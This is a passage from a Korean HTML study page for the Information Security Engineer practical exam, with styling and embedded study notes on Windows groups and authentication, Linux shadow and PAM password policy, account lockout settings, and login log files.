<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>정보보안기사 실기 학습 · SecEngineer Study</title>
<style>
  :root{
    --bg:#ffffff; --bg2:#f7f9fc; --panel:#ffffff; --panel2:#f4f7fb;
    --line:#e3e9f2; --line2:#d3dcea;
    --ink:#111a2b; --ink-dim:#44546e; --ink-mute:#8493a8;
    --brand:#0d97a1; --brand-deep:#0a7a83; --brand-ink:#eafeff;
    --star:#c9871a; --star-bg:#fdf4e2;
    --add:#6d5bd0; --add-bg:#f0edfb;
    --done:#16a86b; --shadow:0 4px 18px rgba(30,50,90,.07);
    --ans:#16a86b; --ans-bg:#f0fbf6; --ans-line:#bfe8d4;
    --mono:"SFMono-Regular",ui-monospace,"JetBrains Mono","Consolas",monospace;
    --sans:-apple-system,BlinkMacSystemFont,"Segoe UI","Pretendard","Malgun Gothic",sans-serif;
  }
  *{box-sizing:border-box}
  html,body{margin:0;height:100%}
  body{
    background:var(--bg);
    color:var(--ink); font-family:var(--sans); line-height:1.6;
    -webkit-font-smoothing:antialiased;
  }
  a{color:inherit}
  button{font-family:inherit; cursor:pointer}
  ::selection{background:var(--brand-deep);color:#fff}

  /* ── 레이아웃 ── */
  .app{display:grid; grid-template-columns:300px 1fr; min-height:100vh}
  .sidebar{
    background:var(--bg2);
    border-right:1px solid var(--line); position:sticky; top:0; height:100vh;
    overflow-y:auto; padding:0;
  }
  .main{min-width:0; padding:0}

  /* ── 사이드바 헤더 ── */
  .brand{padding:20px 20px 16px; border-bottom:1px solid var(--line)}
  .brand .kicker{font:600 11px/1 var(--mono); letter-spacing:.22em; color:var(--brand); text-transform:uppercase}
  .brand h1{margin:8px 0 2px; font-size:19px; font-weight:800; letter-spacing:-.01em}
  .brand .sub{font-size:12px; color:var(--ink-mute)}

  .progress-wrap{padding:14px 20px; border-bottom:1px solid var(--line)}
  .progress-top{display:flex; justify-content:space-between; align-items:baseline; margin-bottom:7px}
  .progress-top b{font:700 13px/1 var(--sans)}
  .progress-top span{font:600 12px/1 var(--mono); color:var(--brand)}
  .bar{height:7px; background:var(--panel); border-radius:99px; overflow:hidden}
  .bar > i{display:block; height:100%; width:0;
    background:linear-gradient(90deg,var(--brand-deep),var(--brand)); border-radius:99px; transition:width .4s}

  /* ── 네비 트리 ── */
  nav{padding:8px 10px 40px}
  .all-btn{
    width:100%; text-align:left; background:var(--panel); border:1px solid var(--line2);
    color:var(--ink); padding:10px 12px; border-radius:9px; margin:2px 0 8px;
    display:flex; align-items:center; gap:9px; font-size:13.5px; font-weight:700;
  }
  .all-btn:hover{border-color:var(--brand); color:var(--brand)}
  .all-btn.active{background:var(--brand-deep); border-color:var(--brand-deep); color:#eafeff}
  .all-btn .cnt{margin-left:auto; font:600 11px/1 var(--mono); opacity:.75}
  .subj{margin:3px 0}
  .subj > .subj-btn{
    width:100%; text-align:left; background:transparent; border:0; color:var(--ink);
    padding:9px 10px; border-radius:9px; display:flex; align-items:center; gap:9px;
    font-size:13.5px; font-weight:700;
  }
  .subj > .subj-btn:hover{background:var(--panel)}
  .subj-btn .num{
    width:22px;height:22px;flex:none;display:grid;place-items:center;border-radius:6px;
    background:var(--panel2); color:var(--brand); font:700 12px/1 var(--mono);
  }
  .subj-btn .cnt{margin-left:auto; font:600 11px/1 var(--mono); color:var(--ink-mute)}
  .subj-btn .chev{transition:transform .2s; color:var(--ink-mute); font-size:10px}
  .subj.open .chev{transform:rotate(90deg)}
  .sections{display:none; padding:2px 0 6px 8px; margin-left:14px; border-left:1px solid var(--line)}
  .subj.open .sections{display:block}
  .sec-btn{
    width:100%; text-align:left; background:transparent; border:0; color:var(--ink-dim);
    padding:6px 10px; border-radius:7px; font-size:12.5px; display:flex; gap:8px; align-items:center;
  }
  .sec-btn:hover{background:var(--panel); color:var(--ink)}
  .sec-btn.active{background:var(--brand-deep); color:#eafeff; font-weight:600}
  .sec-btn .sc{margin-left:auto; font:600 10px/1 var(--mono); opacity:.7}

  /* ── 메인 헤더/툴바 ── */
  .topbar{
    position:sticky; top:0; z-index:20; background:rgba(255,255,255,.85);
    backdrop-filter:blur(10px); border-bottom:1px solid var(--line);
    padding:14px 26px; display:flex; align-items:center; gap:12px; flex-wrap:wrap;
  }
  .search{flex:1 1 260px; position:relative; min-width:180px}
  .search input{
    width:100%; background:var(--panel); border:1px solid var(--line2); color:var(--ink);
    border-radius:10px; padding:10px 12px 10px 36px; font-size:14px; outline:none;
  }
  .search input:focus{border-color:var(--brand); box-shadow:0 0 0 3px rgba(57,208,216,.15)}
  .search svg{position:absolute; left:11px; top:50%; transform:translateY(-50%); opacity:.5}
  .modes{display:flex; gap:4px; background:var(--panel); padding:4px; border-radius:10px; border:1px solid var(--line)}
  .modes button{
    border:0; background:transparent; color:var(--ink-dim); padding:7px 13px; border-radius:7px;
    font-size:13px; font-weight:600;
  }
  .modes button.on{background:var(--brand-deep); color:#eafeff}
  .modes a.ext-link{
    border:0; background:transparent; color:var(--ink-dim); padding:7px 13px; border-radius:7px;
    font-size:13px; font-weight:600; text-decoration:none; display:inline-flex; align-items:center; gap:4px;
  }
  .modes a.ext-link:hover{color:var(--brand)}
  .filters{display:flex; gap:6px; flex-wrap:wrap}
  .chip{
    border:1px solid var(--line2); background:var(--panel); color:var(--ink-dim);
    padding:6px 11px; border-radius:99px; font-size:12px; font-weight:600; display:flex; gap:6px; align-items:center;
  }
  .chip.on[data-f="star"]{border-color:var(--star); color:var(--star); background:var(--star-bg)}
  .chip.on[data-f="add"]{border-color:var(--add); color:var(--add); background:var(--add-bg)}
  .chip.on[data-f="todo"]{border-color:var(--brand); color:var(--brand); background:#e6f7f8}

  /* ── 콘텐츠 영역 ── */
  .content{padding:26px 30px 80px; max-width:960px; margin:0 auto}
  /* 예상문제 모드: 사이드바 숨기고 전체 폭 사용 */
  body.exam-mode .sidebar{display:none}
  body.exam-mode .app{grid-template-columns:1fr}
  body.exam-mode .content{max-width:1080px}
  body.exam-mode .menu-btn{display:none !important}
  .crumb{font:600 11px/1 var(--mono); letter-spacing:.12em; color:var(--ink-mute); text-transform:uppercase; margin-bottom:6px}
  .page-h{display:flex; align-items:center; gap:14px; margin:0 0 4px; flex-wrap:wrap}
  .page-h h2{margin:0; font-size:26px; font-weight:800; letter-spacing:-.02em}
  .page-meta{color:var(--ink-mute); font-size:13px; margin-bottom:22px}

  /* ── 카드(항목) ── */
  .card{
    background:var(--panel);
    border:1px solid var(--line); border-radius:14px; margin:0 0 14px; overflow:hidden;
    box-shadow:var(--shadow);
  }
  .card.done{border-color:rgba(22,168,107,.35); background:#f5fcf9}
  .card-head{
    display:flex; align-items:flex-start; gap:12px; padding:16px 18px; cursor:pointer;
    user-select:none;
  }
  .card-head:hover{background:rgba(255,255,255,.02)}
  .chk{
    flex:none; width:22px; height:22px; border-radius:7px; border:1.5px solid var(--line2);
    background:var(--bg); display:grid; place-items:center; margin-top:2px; transition:.15s;
  }
  .chk svg{opacity:0; transform:scale(.6); transition:.15s; color:#fff}
  .card.done .chk{background:var(--done); border-color:var(--done)}
  .card.done .chk svg{opacity:1; transform:scale(1)}
  .card-titles{flex:1; min-width:0}
  .card-title{font-size:16px; font-weight:700; line-height:1.35}
  .card.done .card-title{color:var(--ink-dim)}
  .badges{display:inline-flex; gap:6px; margin-left:8px; vertical-align:middle}
  .badge{font:700 10px/1 var(--mono); padding:3px 6px; border-radius:5px; letter-spacing:.03em}
  .badge.star{background:var(--star-bg); color:var(--star)}
  .badge.add{background:var(--add-bg); color:var(--add); border:1px solid #d8d0f2}
  .add-mark{
    display:inline-block; margin:16px 0 6px; padding:5px 12px; border-radius:99px;
    font:700 11px/1 var(--mono); letter-spacing:.04em;
    background:var(--add-bg); color:var(--add); border:1px solid #d8d0f2;
  }
  .card-tag{font-size:11.5px; color:var(--ink-mute); margin-top:3px}
  .card-toggle{flex:none; color:var(--ink-mute); font-size:12px; margin-top:4px; transition:transform .2s}
  .card.expanded .card-toggle{transform:rotate(180deg)}
  .card-body{display:none; padding:2px 18px 20px 52px; border-top:1px solid var(--line)}
  .card.expanded .card-body{display:block}

  /* ── 마크다운 렌더링 ── */
  .md{font-size:14.5px; color:var(--ink-dim)}
  .md p{margin:10px 0}
  .md strong{color:var(--ink); font-weight:700}
  .md ul{margin:8px 0; padding-left:20px}
  .md li{margin:5px 0}
  .md li::marker{color:var(--brand)}
  .md code{
    font:500 12.5px/1.5 var(--mono); background:#eef3f8; color:#0a6a72;
    padding:2px 6px; border-radius:5px; border:1px solid var(--line);
  }
  .md pre{
    background:#f4f7fb; border:1px solid var(--line); border-radius:10px;
    padding:14px 16px; overflow-x:auto; margin:12px 0;
  }
  .md pre code{background:none; border:0; padding:0; color:#2a3a52; font-size:12.5px}
  .md table{border-collapse:collapse; width:100%; margin:12px 0; font-size:13px}
  .md th,.md td{border:1px solid var(--line2); padding:7px 10px; text-align:left}
  .md th{background:var(--panel2); color:var(--ink); font-weight:700}
  .md hr{border:0; border-top:1px solid var(--line); margin:14px 0}
  mark{background:#ffe9a8; color:#5a4300; border-radius:3px; padding:0 2px}

  /* ── 플래시카드 모드 ── */
  .flash-wrap{max-width:720px; margin:10px auto; text-align:center}
  .flash-count{font:600 12px/1 var(--mono); color:var(--ink-mute); margin-bottom:14px; letter-spacing:.1em}
  .flash{
    max-height:74vh; margin-bottom:20px; border-radius:18px;
    border:1px solid var(--line); background:var(--panel);
    box-shadow:0 10px 34px rgba(30,50,90,.10); overflow-y:auto; text-align:left;
  }
  .flash-q{padding:26px 30px 20px; background:var(--bg2); border-bottom:1px solid var(--line)}
  .flash-q .fq-crumb{font:600 11px/1 var(--mono); letter-spacing:.15em; color:var(--brand); text-transform:uppercase; margin-bottom:14px}
  .flash-q .fq-title{font-size:23px; font-weight:800; line-height:1.35; letter-spacing:-.01em}
  .flash-a{padding:22px 30px 28px}
  .flash-a .fb-title{font:600 11px/1 var(--mono); letter-spacing:.15em; color:var(--ink-mute); text-transform:uppercase; margin-bottom:14px}
  .flash-nav{display:flex; gap:10px; justify-content:center; align-items:center; flex-wrap:wrap}
  .flash-nav button{
    background:var(--panel); border:1px solid var(--line2); color:var(--ink);
    padding:11px 20px; border-radius:11px; font-size:14px; font-weight:600;
  }
  .flash-nav button:hover{border-color:var(--brand); color:var(--brand)}
  .flash-nav .primary{background:var(--brand-deep); border-color:var(--brand-deep); color:#eafeff}
  .flash-nav .know{background:transparent; border-color:var(--done); color:var(--done)}

  /* ── 예상문제 모드 ── */
  .exam-intro{margin-bottom:18px}
  .exam-intro .ei-title{font-size:24px; font-weight:800; letter-spacing:-.01em; margin-bottom:6px}
  .exam-intro .ei-sub{color:var(--ink-mute); font-size:13px}
  .round-tabs{display:flex; gap:8px; flex-wrap:wrap; margin:16px 0 6px}
  .round-tab{border:1px solid var(--line2); background:var(--panel); color:var(--ink-dim);
    padding:9px 16px; border-radius:10px; font-size:13.5px; font-weight:700; cursor:pointer}
  .round-tab:hover{border-color:var(--brand); color:var(--brand)}
  .round-tab.on{background:var(--brand-deep); border-color:var(--brand-deep); color:#fff}
  .exam-bar{display:flex; align-items:center; gap:10px; flex-wrap:wrap; margin:14px 0 18px;
    padding:12px 16px; background:var(--bg2); border:1px solid var(--line); border-radius:12px}
  .exam-bar .escore{font:700 14px/1 var(--sans)} .exam-bar .escore b{color:var(--brand)}
  .exam-bar .spacer{flex:1}
  .exam-bar .ebtn{border:1px solid var(--line2); background:var(--panel); color:var(--ink-dim);
    padding:7px 12px; border-radius:8px; font-size:12.5px; font-weight:600; cursor:pointer}
  .exam-bar .ebtn:hover{border-color:var(--brand); color:var(--brand)}
  .sec-div{display:flex; align-items:center; gap:12px; margin:24px 2px 12px}
  .sec-div h3{margin:0; font-size:14px; font-weight:800; white-space:nowrap}
  .sec-div .l{flex:1; height:1px; background:var(--line2)}
  .sec-div .p{font:600 11px/1 var(--mono); color:var(--ink-mute)}
  .exq{background:var(--panel); border:1px solid var(--line); border-radius:14px; margin-bottom:14px; box-shadow:var(--shadow); overflow:hidden}
  .exq-head{display:flex; align-items:center; gap:9px; padding:14px 18px 0}
  .exq-no{width:28px;height:28px;flex:none;display:grid;place-items:center;border-radius:7px;background:var(--brand-deep);color:#fff;font:800 13px/1 var(--mono)}
  .exq-type{font:700 10px/1 var(--mono); padding:4px 7px; border-radius:5px}
  .exq-type.t단답형{background:#e6f7f8; color:#0a7a83}
  .exq-type.t서술형{background:#fdf1e3; color:#b8630f}
  .exq-type.t실무형{background:#f0edfb; color:#6d5bd0}
  .exq-dom{font-size:11.5px; color:var(--ink-mute)}
  .exq-pts{margin-left:auto; font:700 11px/1 var(--mono); color:var(--brand)}
  .exq-body{padding:11px 18px 16px}
  .exq-q{font-size:14.5px; color:var(--ink); white-space:pre-wrap; word-break:keep-all}
  .exq-q strong{font-weight:700}
  .exq-scen{margin:12px 0}
  .exq-scen .md{font-size:13.5px; color:var(--ink-dim)}
  /* 시나리오 안의 로그/코드는 어두운 터미널 박스 + 밝은 글씨로 또렷하게 */
  .exq-scen .md pre{background:#0f1826; border:1px solid #24334a; border-radius:10px;
    padding:14px 16px; margin:10px 0; overflow-x:auto; -webkit-overflow-scrolling:touch}
  .exq-scen .md pre code{color:#eef4fb; font-size:13px; line-height:1.85;
    white-space:pre; font-weight:500; letter-spacing:.1px}
  .exq-scen .md p{color:var(--ink); margin:8px 0}
  .exq-scen .md strong{color:var(--ink); font-weight:700}
  @media(max-width:860px){
    /* 모바일: 긴 로그가 화면 밖으로 잘리지 않도록 줄바꿈 허용 */
    .exq-scen .md pre code{white-space:pre-wrap; word-break:break-all; font-size:12px; line-height:1.9}
  }
  .exq-ta{width:100%; min-height:64px; resize:vertical; margin-top:12px; border:1px solid var(--line2);
    border-radius:10px; padding:10px 12px; font-size:13.5px; font-family:var(--sans); color:var(--ink); background:var(--bg2); outline:none}
  .exq-ta:focus{border-color:var(--brand); background:#fff; box-shadow:0 0 0 3px rgba(13,151,161,.1)}
  .exq-reveal{margin-top:11px; width:100%; border:1px dashed var(--line2); background:var(--bg2);
    color:var(--brand-deep); padding:10px; border-radius:10px; font-size:13px; font-weight:700; cursor:pointer}
  .exq-reveal:hover{border-color:var(--brand); background:#fff}
  .exq-ans{display:none; margin-top:12px; border:1px solid var(--ans-line); border-radius:12px; overflow:hidden}
  .exq.open .exq-ans{display:block} .exq.open .exq-reveal{display:none}
  .exq-ans .at{background:var(--ans-bg); color:var(--ans); font:700 11px/1 var(--mono); padding:8px 15px; border-bottom:1px solid var(--ans-line); letter-spacing:.05em}
  .exq-ans .ab{padding:13px 16px}
  .exq-ans .et{margin-top:12px; padding-top:11px; border-top:1px dashed var(--line2); font:700 10px/1 var(--mono); color:var(--ink-mute); letter-spacing:.05em}
  .exq-sc{display:none; margin-top:11px; padding-top:11px; border-top:1px dashed var(--line2); align-items:center; gap:8px; flex-wrap:wrap}
  .exq.open .exq-sc{display:flex}
  .exq-sc .l{font-size:12px; font-weight:600; color:var(--ink-mute)}
  .scb{border:1px solid var(--line2); background:var(--panel); padding:5px 11px; border-radius:7px; font-size:12px; font-weight:700; cursor:pointer; color:var(--ink-dim)}
  .scb.c.on{background:#eafaf2; border-color:var(--ans); color:var(--ans)}
  .scb.p.on{background:#fff7e8; border-color:#b8630f; color:#b8630f}
  .scb.w.on{background:#fdeef0; border-color:#d2455a; color:#d2455a}
  .exam-foot{text-align:center; color:var(--ink-mute); font-size:12px; margin:24px 0 10px; line-height:1.7}

  /* ── 빈 상태 ── */
  .empty{text-align:center; padding:70px 20px; color:var(--ink-mute)}
  .empty .big{font-size:44px; margin-bottom:10px}

  /* ── 사이드바 토글 버튼 ── */
  .menu-btn{display:grid; place-items:center; width:38px;height:38px; border-radius:9px;
    background:var(--panel); border:1px solid var(--line2); color:var(--ink)}
  .menu-btn:hover{border-color:var(--brand); color:var(--brand)}

  /* ── 데스크톱: 사이드바 접기 ── */
  @media(min-width:861px){
    .app{transition:grid-template-columns .25s ease}
    .sidebar > *{min-width:300px}
    body.side-collapsed .app{grid-template-columns:0px 1fr}
    body.side-collapsed .sidebar{overflow:hidden; border-right:0}
  }

  /* ── 반응형 ── */
  @media(max-width:860px){
    .app{grid-template-columns:1fr}
    .sidebar{position:fixed; z-index:60; width:300px; transform:translateX(-100%); transition:transform .25s}
    .sidebar.show{transform:none}
    .scrim{display:none; position:fixed; inset:0; background:rgba(0,0,0,.5); z-index:55}
    .scrim.show{display:block}
    .content{padding:20px 16px 70px}
    .page-h h2{font-size:22px}
    .card-body{padding-left:18px}
    .flash-wrap{margin:6px auto 84px}
    .flash{max-height:none; overflow-y:visible; border-radius:14px}
    .flash-q{padding:18px 16px 15px}
    .flash-q .fq-title{font-size:19px}
    .flash-a{padding:16px 16px 22px}
    .flash-nav{
      position:fixed; left:0; right:0; bottom:0; z-index:40; margin:0; gap:8px; flex-wrap:nowrap;
      padding:10px 12px calc(10px + env(safe-area-inset-bottom)); background:rgba(255,255,255,.92);
      backdrop-filter:blur(6px); border-top:1px solid var(--line); box-shadow:0 -6px 20px rgba(30,50,90,.08);
    }
    .flash-nav button{flex:1; padding:12px 8px; font-size:13px; white-space:nowrap}
  }
</style>
</head>
<body>
<div class="scrim" id="scrim"></div>
<div class="app">
  <!-- 사이드바 -->
  <aside class="sidebar" id="sidebar">
    <div class="brand">
      <div class="kicker">SecEngineer · 실기</div>
      <h1>정보보안기사 실기</h1>
      <div class="sub">통합 정리 학습 · <span id="totalCount"></span>개 항목</div>
    </div>
    <div class="progress-wrap">
      <div class="progress-top"><b>학습 진도</b><span id="progTxt">0%</span></div>
      <div class="bar"><i id="progBar"></i></div>
    </div>
    <nav id="nav"></nav>
  </aside>

  <!-- 메인 -->
  <div class="main">
    <div class="topbar">
      <button class="menu-btn" id="menuBtn" aria-label="사이드바 접기/펼치기" title="사이드바 접기/펼치기">☰</button>

<script>window.STUDY_DATA=[{"num":1,"title":"시스템 보안","sections":[{"title":"Windows","items":[{"title":"윈도우 OS 기본 그룹","star":false,"body":"- **Administrators** : 시스템의 모든 권한을 가진 최고 관리자\n- **Power Users** : 디렉터리나 네트워크를 공유할 수 있고 공용 프로그램 그룹을 생성\n- **Backup Operators** : 시스템 백업을 위해 모든 파일과 디렉터리에 접근할 수 있는 그룹\n\n::보강::\n- **Users** : 시스템에서 부여한 기본 권한만 갖는 **일반 사용자** 그룹. 시스템 설정 변경·프로그램 설치 불가(대부분의 계정이 여기 속함)\n- **Guests** : 임시 접속용 **게스트** 그룹. Users보다 제한적이며 기본적으로 비활성화 권장(불필요 시 사용 중지)\n- **Power Users** : 관리자에 준하는 일부 권한 보유. 보안상 위험이 있어 **Windows Vista 이후 사실상 폐지**(하위 호환 목적으로만 유지) ★\n- **Backup Operators** : 백업·복원을 위해 파일 접근 권한이 부여되나, 이를 악용해 SAM 등 민감 파일에 접근할 수 있어 **최소 인원만 등록**\n- **Remote Desktop Users** : 원격 데스크톱(RDP) 접속이 허용된 사용자 그룹\n- **Network Configuration Operators** : 네트워크 설정 변경 권한을 가진 그룹\n\n**그룹 vs 계정 참고**\n- 기본 로컬 계정 : **Administrator**(내장 관리자, 비활성화·이름 변경 권장), **Guest**(게스트, 비활성화 권장)\n- **SID(보안 식별자)** : 계정·그룹을 식별하는 고유값. 관리자 그룹의 상대 식별자(RID)는 **500**(Administrator), 관리자 그룹은 **544**\n- **보안 조치** : Administrator 계정은 **이름 변경 + 비활성화**, 불필요한 그룹 소속 계정 정리, Everyone 그룹 권한 최소화","added":false,"hasAdd":true},{"title":"사용자 계정 컨트롤 (UAC)","star":false,"body":"- **발생 원인** : 프로그램을 관리자 권한으로 실행 시 발생\n- **[예] 버튼이 비활성화된 이유**\n  - 윈도우 관리자 계정이 정상이 아닌 경우(비활성화·삭제)\n  - 윈도우 시스템 파일이 손상된 경우","added":false},{"title":"윈도우 공유·세션 관리 명령어","star":false,"body":"- **net share** : 서버의 공유 리소스(공유 폴더·드라이브) 목록을 확인·설정하는 명령어\n- **net session** : 서버에 연결된 세션(접속자) 정보를 확인\n- **net session /delete** : 허가되지 않은(본인 외) 연결을 확인했을 때 해당 세션을 강제 종료 (`/del`로도 사용 가능)","added":false},{"title":"NTFS 파일 시스템","star":false,"body":"- **정의** : 윈도우 NT 계열 OS에서 사용하는 파일 시스템. 접근제어(ACL)와 저널링 복구 기능 제공\n- **특징**\n  - 접근제어 : 파일·폴더 단위 권한 설정으로 보안 강화\n  - 저널링 : 변경 내역을 기록하여 시스템 장애 시 복구 지원","added":false},{"title":"NetBIOS 바인딩 취약점","star":false,"body":"- **취약한 이유** : 인터넷에 직접 연결된 Windows 시스템에서 NetBIOS와 TCP/IP 바인딩이 활성화된 경우, 공격자가 네트워크 공유 자원을 악용할 위험 존재\n- **보안 설정 방법 (ncpa.cpl)**\n  - 시작 → 실행 → `ncpa.cpl` → 로컬 영역 연결 → 속성 → TCP/IP → [일반] 탭 [고급] → [WINS] 탭에서 **\"NetBIOS over TCP/IP 사용 안 함\"** 선택","added":false},{"title":"윈도우 이벤트 로그 크기 계산","star":false,"body":"- **조건** : 로그 1개 평균 500byte, 하루 약 1,000개, 30일 보관\n- **계산** : `500 × 1,000 × 30 = 15,000,000 byte`\n- **설정 경로** : 이벤트 뷰어 → 로그 선택 → 속성 → 일반 → 최대 로그 크기 설정","added":false},{"title":"윈도우 주요 서비스 로그 경로","star":true,"body":"- **HTTPERR** : IIS 웹 서버의 HTTP 프로토콜 오류(요청 실패 등)를 기록\n  - 경로 : `%SystemRoot%\\System32\\LogFiles\\HTTPERR\\`\n- **DHCP** : DHCP 서버의 IP 주소 할당·임대 관련 로그\n  - 경로 : `%SystemRoot%\\System32\\dhcp\\`","added":false},{"title":"Windows 인증 구조 (SAM / LSA / NTLM)","star":false,"body":"- **SAM (Security Account Manager)** : 로컬 사용자 계정·패스워드(해시)를 저장하는 DB 파일 (`%SystemRoot%\\System32\\config\\SAM`)\n- **LSA (Local Security Authority)** : 모든 계정의 로그인 검증·SID(보안 식별자) 관리·감사 로그 생성\n- **NTLM** : 챌린지-응답 방식 인증 프로토콜. **Pass the Hash** 공격 대상\n- **Kerberos** : Windows 도메인(AD) 기본 인증. 티켓(TGT) 기반, **Golden Ticket** 공격 대상","added":true}]},{"title":"Linux/Unix — 계정 · 인증","items":[{"title":"shadow 파일","star":false,"body":"- **정의** : 암호화된 패스워드와 패스워드 정책 정보를 저장하는 텍스트 파일\n- **정책과의 관계** : `/etc/shadow`에 패스워드를 분리 저장하는 경우, `/etc/passwd`의 두 번째(패스워드) 필드에는 **`x`**가 표시됨 ★\n- **구성 항목** : 계정명 / 암호화된 패스워드 / 마지막 변경일 / 최소 사용 기간 / 최대 사용 기간 / 만료 경고 기간 / 비활성화 일수 / 만료일 (+ 예약 필드)","added":false},{"title":"암호화된 패스워드 필드 구조","star":true,"body":"- 형식 : `$6$hs3nm0$D2lU8~` → **`$해시함수$솔트$해시값`**\n  - **① 첫 번째 필드 (`$6`)** : 해시값을 구하기 위해 사용한 **해시 함수** 표시\n    - `$1` = MD5, `$5` = SHA-256, `$6` = SHA-512\n  - **② 두 번째 필드 (`hs3nm0`)** : 해시에 추가할 임의의 값(**솔트, Salt**) 표시\n    - **솔트가 레인보우 테이블 공격을 막는 이유** : 해시 연산 시 솔트를 추가 입력으로 사용하면 **동일한 암호라도 해시값이 달라지므로**, 미리 계산된 해시 목록(레인보우 테이블)으로 대조하는 공격이 무력화됨\n  - **③ 세 번째 필드 (`D2lU8~`)** : 해시 함수와 솔트 값으로 패스워드를 암호화한 **결과 값**\n- **관련 명령어**\n  - **`pwconv`** : `/etc/passwd`의 패스워드를 `/etc/shadow`로 분리(shadow 활성화)\n  - **`pwunconv`** : `/etc/shadow`의 패스워드를 다시 `/etc/passwd`의 패스워드 항목으로 되돌리고 **shadow 파일을 비활성화**","added":false},{"title":"PAM (Pluggable Authentication Module) Type","star":false,"body":"- **정의** : 리눅스에서 인증을 모듈 단위로 처리하는 구조. `type`은 모듈이 어떤 인증에 쓰이는지 지정\n- **Type 4종**\n  - **auth** : 사용자 신원 식별 및 인증 수행 (비밀번호 요청·검증)\n  - **account** : 인증된 사용자의 시스템 액세스 권한(유효성) 확인\n  - **password** : 사용자 비밀번호 변경·업데이트 관리\n  - **session** : 인증 성공 직후~로그아웃까지 세션의 시작·종료 구성·관리","added":false},{"title":"OS별 패스워드 최소 길이(8자리) 설정","star":false,"body":"| OS | 파일 | 설정 |\n|---|---|---|\n| Solaris | `/etc/default/passwd` | `PASSLENGTH=8` |\n| Linux | `/etc/security/pwquality.conf` | `minlen=8` |\n| AIX | `/etc/security/user` | `minlen=8` |\n| HP-UX | `/etc/default/security` | `MIN_PASSWORD_LENGTH=8` |","added":false},{"title":"리눅스 패스워드 복잡도 설정","star":false,"body":"- `/etc/security/pwquality.conf` 에서 설정\n  - `minlen` : 최소 길이\n  - `lcredit` / `ucredit` / `dcredit` / `ocredit` : 소문자·대문자·숫자·특수문자 최소 포함 수(음수로 강제)","added":false},{"title":"login.defs (패스워드 정책 파일)","star":true,"body":"- **정의** : `/etc/login.defs` — 리눅스에서 패스워드의 **만료·최대/최소 사용기간** 등 계정 생성 시 적용되는 정책을 설정하는 파일\n- **주요 항목** : `PASS_MAX_DAYS`(최대 사용기간), `PASS_MIN_DAYS`(최소 변경기간), `PASS_WARN_AGE`(만료 경고기간), `PASS_MIN_LEN`\n- **주의** : \"리눅스 + 위 3가지 정책 설정 파일\"을 물으면 정답은 **login.defs** (passwd·shadow가 아님)","added":false},{"title":"계정 잠금 임계값 (pam_tally / pam_faillock)","star":true,"body":"- 설정 파일 : `/etc/pam.d/system-auth`(RHEL 계열) 또는 `/etc/pam.d/common-auth`(데비안 계열)\n- 예: `auth required /lib/security/pam_tally.so deny=5 unlock_time=120 no_magic_root reset`\n  - **`deny=5`** : 인증 **5회 실패 시 계정 잠금**\n  - **`unlock_time=120`** : 마지막 인증 실패 시점부터 **120초 후 자동 잠금 해제**\n  - **`no_magic_root`** : **root 계정은 잠금 예외**\n  - **`reset`** : 접속 **성공 시 실패 횟수 초기화**","added":false},{"title":"세션 타임아웃 및 원격 접속 제한","star":false,"body":"- **세션 타임아웃 600초 설정** : `/etc/profile`(또는 `.profile`)에 `TMOUT=600` 및 `export TMOUT` 추가\n  - 일정 시간 미입력 시 자동 로그아웃 → 자리 비움 중 세션 탈취 방지\n- **pts(가상 터미널) 설정 제거 파일** : `/etc/securetty`\n  - 해당 파일에서 `pts` 항목을 제거하여 root의 원격 터미널 직접 로그인을 차단","added":false}]},{"title":"Linux/Unix — 로그","items":[{"title":"로그인 관련 로그 파일","star":false,"body":"- **utmp** : 현재 시스템에 로그인한 사용자의 상태 정보 (`who`, `w`)\n- **wtmp** : 성공한 로그인·로그아웃 기록 (`last`)\n- **btmp** : 실패한 로그인 시도 기록 (`lastb`)\n- **lastlog** : 각 사용자의 가장 최근 로그인 기록 (`lastlog`)\n\n::보강::\n**로그 파일 형식 구분** ★\n- **바이너리 로그** : `utmp`·`wtmp`·`btmp`·`lastlog` → 텍스트 편집기로 못 보고 **전용 명령어**(`who`/`last`/`lastb`/`lastlog`)로 확인\n- **텍스트 로그** : `secure`·`messages`·`maillog` 등 → `cat`·`vi`·`tail`로 직접 조회 가능\n\n**로그 파일별 경로·용도(리눅스/RHEL 계열)**\n| 로그 파일 | 경로 | 기록 내용 | 확인 |\n|---|---|---|---|\n| **utmp** | `/var/run/utmp` | 현재 로그인 사용자 상태 | `who`, `w` |\n| **wtmp** | `/var/log/wtmp` | 로그인·로그아웃·재부팅 성공 이력 | `last` |\n| **btmp** | `/var/log/btmp` | **로그인 실패** 기록 | `lastb` |\n| **lastlog** | `/var/log/lastlog` | 사용자별 **최근 로그인** 시각 | `lastlog` |\n| **secure** | `/var/log/secure` | 인증·su·sudo·원격접속 등 **보안 관련** 로그 | `tail`, `cat` |\n| **messages** | `/var/log/messages` | 커널·시스템 전반의 주요 메시지 | `tail`, `cat` |\n| **cron** | `/var/log/cron` | 크론(예약 작업) 실행 로그 | `cat` |\n| **maillog** | `/var/log/maillog` | sendmail 등 메일 송·수신 로그 | `cat` |\n| **xferlog** | `/var/log/xferlog` | **FTP** 파일 전송 로그 | `cat` |\n| **sulog** | `/var/log/sulog` | **su(사용자 전환)** 성공·실패 로그 | `cat` |\n| **dmesg** | `/var/log/dmesg` | 부팅 시 커널 링버퍼 메시지 | `dmesg` |\n\n- **주의(경로 상이)** : **솔라리스(Solaris)**의 wtmp/utmp는 `wtmpx`/`utmpx`(확장 포맷)를 사용하고 경로도 `/var/adm/`으로 다름\n- **관련 개념** : 침해 시 공격자가 **wtmp·btmp·secure**를 삭제·변조해 흔적을 지우므로 **원격 로그 서버(remote syslog)**로 별도 수집 권장\n\n**syslog 우선순위(Severity) 참고**\n- 낮을수록 심각 : `emerg(0)` → `alert(1)` → `crit(2)` → `err(3)` → `warning(4)` → `notice(5)` → `info(6)` → `debug(7)`\n- 설정 파일 : `/etc/rsyslog.conf`(또는 `/etc/syslog.conf`) — `[facility].[priority]  [저장경로]` 형식","added":false,"hasAdd":true},{"title":"명령어 실행 로그 (lastcomm)","star":false,"body":"- **정의** : 로그인한 모든 사용자가 로그아웃까지 입력한 명령어, 터미널, 프로세스 시간 등을 담은 `acct`/`pacct` 로그 파일을 확인하는 명령어","added":false},{"title":"lsof (List Open Files)","star":false,"body":"- **정의** : 현재 열려 있는 파일 정보를 출력하는 명령어\n- **용도** : 특정 파일·디바이스를 사용 중인 프로세스 확인, 네트워크 소켓·열린 포트 확인","added":false}]},{"title":"Linux/Unix — 파일 · 권한 · 서비스","items":[{"title":"/proc 디렉터리","star":false,"body":"- 현재 실행 